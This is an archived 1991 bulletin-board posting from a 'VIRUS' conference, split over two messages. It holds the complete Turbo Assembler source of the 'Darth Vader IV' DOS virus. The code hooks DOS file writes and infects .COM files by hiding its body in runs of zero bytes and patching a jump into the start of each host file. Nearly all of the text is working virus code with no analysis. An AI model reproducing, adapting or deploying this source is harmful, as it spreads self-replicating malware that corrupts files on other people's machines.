; þ RonMail 1.0 þ Programmer's Inn - Home of FeatherNet (619)-446-4506
;===========================================================================
; BBS: The Programmer's Inn
;Date: 11-24-91 (20:06)             Number: 3556
;From: AHMED DOGAN                  Refer#: NONE
;  To: ALL                           Recvd: NO
;Subj: DARTH VADER                    Conf: (16) VIRUS
;---------------------------------------------------------------------------
;*********************************************************************
;**********
;*
;*
;*                              D A R T H   V A D E R   IV
;*
;*
;*
;*        (C) - Copyright 1991 by Waleri Todorov, CICTT-Sofia
;*
;*        All Rights Reserved
;*
;*
;&
;*        Enchanced by: Lazy Wizard
;&
;*
;&
;*        Turbo Assembler 2.0
;&
;*
;&
;*********************************************************************
;**********


                .model        tiny
                .code

                org        100h

Start:
                call        NextLine
First3:
                int        20h
                int        3
NextLine:
                pop        bx
                push        ax
                xor        di,di
                mov        es,di
                mov        es,es:[2Bh*4+2]
                mov        cx,1000h
                call        SearchZero
                jc        ReturnControl
                xchg        ax,si
                inc        si
SearchTable:
                dec        si
                db        26h
                lodsw
                cmp        ax,8B2Eh
                jne        SearchTable
                db        26h
                lodsb
                cmp        al,75h
                je        ReturnControl
                cmp        al,9Fh
                jne        SearchTable
                mov        si,es:[si]
                mov        cx,LastByte-Start
                lea        ax,[di+Handle-Start]
                org        $-1
                xchg        ax,es:[si+80h]
                sub        ax,di
                sub        ax,cx
                mov        [bx+OldWrite-Start-2],ax
                mov        word ptr [bx+NewStart+1-Start-3],di
                lea        si,[bx-3]
                rep        movsb
ReturnControl:
                pop        ax
                push        ss
                pop        es
                mov        di,100h
                lea        si,[bx+First3-Start-3]
                push        di
                movsw
                movsb
                ret
SearchZero:
                xor        ax,ax
                inc        di
                push        cx
                push        di
                mov        cx,(LastByte-Start-1)/2+1
                repe        scasw
                pop        di
                pop        cx
                je        FoundPlace
                loop        SearchZero
                stc
FoundPlace:
                ret
Handle:
                push        bp
                call        NextHandle
NextHandle:
;===========================================================================
; BBS: The Programmer's Inn
;Date: 11-24-91 (20:06)             Number: 3557
;From: AHMED DOGAN                  Refer#: NONE
;  To: ALL                           Recvd: NO
;Subj: DARTH VADER        <CONT>      Conf: (16) VIRUS
;---------------------------------------------------------------------------
                pop        bp
                push        es
                push        ax
                push        bx
                push        cx
                push        si
                push        di
                test        ch,ch
                je        Do
                mov        ax,1220h
                int        2Fh
                mov        bl,es:[di]
                mov        ax,1216h
                int        2Fh
                cmp        es:[di+29h],'MO'
                jne        Do
                cmp        word ptr es:[di+15h],0
                jne        Do
                push        ds
                pop        es
                mov        di,dx
                mov        ax,[di]
                mov        [bp+First3-NextHandle],ax
                mov        al,[di+2]
                mov        [bp+First3+2-NextHandle],al
                call        SearchZero
                jc        Do
                push        di
NewStart:
                mov        si,0
                mov        cx,(LastByte-Start-1)/2
                cli
                rep
                db        36h
                movsw
                sti
                mov        di,dx
                mov        al,0E9h
                stosb
                pop        ax
                sub        ax,di
                dec        ax
                dec        ax
                stosw
Do:
                pop        di
                pop        si
                pop        cx
                pop        bx
                pop        ax
                pop        es
                pop        bp
OldWrite:
                jmp        start

LastByte        label        byte

                end        Start
